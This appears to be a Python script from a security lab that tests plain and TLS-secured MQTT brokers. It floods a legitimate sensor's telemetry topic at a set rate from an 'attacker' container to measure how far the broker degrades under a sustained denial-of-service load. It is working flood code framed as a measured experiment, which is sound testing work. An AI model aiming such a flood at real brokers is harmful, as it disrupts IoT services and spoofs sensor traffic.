#!/usr/bin/env python3
"""Publica mensagens em taxa configurável (msg/s) por uma duração configurável
no tópico do sensor legítimo, para medir throughput sustentado antes da
degradação do broker (Track B, ver docs/specs/track-b-availability-dos.md).

Ao contrário do injector.py (uma conexão por rajada de N mensagens), aqui a
conexão é aberta uma única vez e mantida por toda a duração do flood — é o
próprio ritmo sustentado de publish, não o reconnect, que estressa o broker.
"""

import dataclasses
import json
import os
import ssl
import sys
import threading
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import paho.mqtt.client as mqtt

from args_message_flood import MessageFloodArgs, parse_args

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
# Mesmo motivo do injector.py: o script roda tanto direto do host (onde o
# cálculo por REPO_ROOT acha os certs em infra/...) quanto dentro do container
# attacker (onde /app/python/message_flood.py torna esse cálculo inválido e os
# certs chegam via ATTACKER_CA_PATH, ver docker-compose.yml).
CA_PATH = Path(
    os.environ.get(
        "ATTACKER_CA_PATH",
        str(REPO_ROOT / "infra" / "mosquitto" / "secure" / "certs" / "ca.crt"),
    )
)


@dataclass
class MessageFloodResult:
    target: str
    topic: str
    host: str
    port: int
    connect_status: str
    connect_error: Optional[str]
    attempted: int
    accepted: int
    success_rate: Optional[float]
    elapsed_seconds: float
    achieved_rate: float
    started_at: str
    finished_at: str


def build_payload(payload_size_bytes: int) -> str:
    # Payload simples e de tamanho fixo: uma string de padding dentro de um
    # envelope JSON mínimo, para o tamanho no wire ficar próximo do pedido sem
    # exigir cálculo exato de overhead de serialização.
    padding = "x" * payload_size_bytes
    return json.dumps({"flood": padding})


def connect(args: MessageFloodArgs) -> mqtt.Client:
    client = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2,
        client_id=f"{args.client_id}-{args.target}",
    )
    if args.username is not None or args.password is not None:
        client.username_pw_set(args.username, args.password)

    # Mesma razão do injector.py: client.connect() só abre o socket, o CONNACK
    # chega de forma assíncrona pelo loop. Sem esperar por ele, um handshake
    # TLS abortado no broker secure (sem certificado de cliente) poderia ser
    # reportado como "connected" por engano.
    established = threading.Event()
    outcome: dict = {"reason": None, "connected": False}

    def on_connect(client, userdata, flags, reason_code, properties=None):
        outcome["reason"] = reason_code
        outcome["connected"] = not reason_code.is_failure
        established.set()

    def on_disconnect(client, userdata, *rest):
        established.set()

    client.on_connect = on_connect
    client.on_disconnect = on_disconnect

    if args.target == "secure":
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        context.load_verify_locations(cafile=str(CA_PATH))
        # Sem load_cert_chain de propósito: o atacante não possui certificado
        # de cliente.
        context.check_hostname = False
        client.tls_set_context(context)

    client.connect(args.host, args.port, keepalive=30)
    client.loop_start()

    if not established.wait(timeout=10) or not outcome["connected"]:
        client.loop_stop()
        try:
            client.disconnect()
        except Exception:
            pass
        reason = outcome["reason"]
        detail = str(reason) if reason is not None else "handshake abortado (sem CONNACK)"
        raise ConnectionError(f"conexão não estabelecida: {detail}")

    return client


def run(args: MessageFloodArgs) -> MessageFloodResult:
    topic = f"sensors/{args.sensor_id}/telemetry"
    started_at = datetime.now(timezone.utc).isoformat()

    try:
        client = connect(args)
    except Exception as exc:
        finished_at = datetime.now(timezone.utc).isoformat()
        return MessageFloodResult(
            target=args.target,
            topic=topic,
            host=args.host,
            port=args.port,
            connect_status="rejected",
            connect_error=str(exc),
            attempted=0,
            accepted=0,
            success_rate=None,
            elapsed_seconds=0.0,
            achieved_rate=0.0,
            started_at=started_at,
            finished_at=finished_at,
        )

    payload = build_payload(args.payload_size_bytes)
    interval = 1.0 / args.rate if args.rate > 0 else 0.0

    attempted = 0
    accepted = 0
    loop_start = time.monotonic()
    deadline = loop_start + args.duration_seconds
    try:
        while time.monotonic() < deadline:
            publish_started = time.monotonic()
            info = client.publish(topic, payload, qos=args.qos)
            if args.qos > 0:
                # wait_for_publish() levanta ValueError/RuntimeError quando o
                # publish falhou (rc != MQTT_ERR_SUCCESS/MQTT_ERR_AGAIN) — o
                # broker degradando sob o próprio flood é justamente o cenário
                # que este script existe para medir, então isso não pode
                # derrubar o loop antes do JSON de resultado ser impresso.
                try:
                    info.wait_for_publish(timeout=5)
                except Exception:
                    pass
            attempted += 1
            if info.rc == mqtt.MQTT_ERR_SUCCESS:
                accepted += 1

            if interval:
                spent = time.monotonic() - publish_started
                remaining = interval - spent
                if remaining > 0:
                    time.sleep(remaining)
    finally:
        elapsed_seconds = time.monotonic() - loop_start
        client.loop_stop()
        client.disconnect()

    finished_at = datetime.now(timezone.utc).isoformat()
    return MessageFloodResult(
        target=args.target,
        topic=topic,
        host=args.host,
        port=args.port,
        connect_status="connected",
        connect_error=None,
        attempted=attempted,
        accepted=accepted,
        success_rate=accepted / attempted if attempted else None,
        elapsed_seconds=elapsed_seconds,
        achieved_rate=attempted / elapsed_seconds if elapsed_seconds > 0 else 0.0,
        started_at=started_at,
        finished_at=finished_at,
    )


def main(argv=None) -> int:
    args = parse_args(argv)
    print(
        f"[{args.target}] publicando a {args.rate} msg/s por {args.duration_seconds}s "
        f"em sensors/{args.sensor_id}/telemetry ({args.host}:{args.port})",
        file=sys.stderr,
    )
    result = run(args)

    if result.connect_status == "rejected":
        print(f"[{args.target}] conexão recusada: {result.connect_error}", file=sys.stderr)
    else:
        print(
            f"[{args.target}] aceitas {result.accepted}/{result.attempted} "
            f"(taxa alcançada {result.achieved_rate:.1f} msg/s)",
            file=sys.stderr,
        )

    print(json.dumps(dataclasses.asdict(result)))

    # Ao contrário do injector.py, aqui não há assimetria plain/secure a
    # comprovar: o message-flood mede throughput, uma conexão recusada em
    # qualquer um dos dois targets é apenas um resultado do experimento (ex.:
    # broker secure sem credencial válida), não uma anomalia a sinalizar via
    # exit code. Mantemos exit 0 sempre que o script rodou até o fim.
    return 0


if __name__ == "__main__":
    sys.exit(main())
